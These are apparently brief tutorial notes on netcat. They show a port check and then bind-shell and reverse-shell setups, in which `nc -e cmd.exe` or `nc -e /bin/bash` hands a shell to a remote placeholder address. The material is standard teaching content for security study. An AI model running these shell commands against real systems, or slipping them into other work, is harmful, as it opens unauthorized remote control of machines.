# Practical Tools

## Netcat

```bash
# check if a port is open
nc-n -v 10.11.0.22 110
```

## REmote Administration With Netcat

Consider this scenario, 2 people A and B each has a computer. A has a public ip address and is directly connected to the internet (like a server), B is not (like a client), has a internal ip address.

Suppose A has a Windows Machine and B has a linux machine (demonstration only, command exactly the same).

Suppose A's public ip address is `<IP-Addr>`

the `-e` option of netcat: program to exec after connect [dangerous!!]

### Netcat Bind Shell Scenario

A sends shell to B and let B control A's computer.

```powershell
# A
nc -nlvp 4444 -e cmd.exe				# Listening on port 4444, run cmd.exe after connection
```

```bash
# B
nc -nv <IP-Addr> 4444					# B then gets the shell/cmd of A
```

### Reverse Shell Scenario

It's called reverse because B is sharing its shell to A this time. 

```powershell
# A
nc -nlvp 4444							# Listening on port 4444
```

```bash
# B
nc -nv <IP-Addr> 4444 -e /bin/bash		# send bash shell to ip address
```
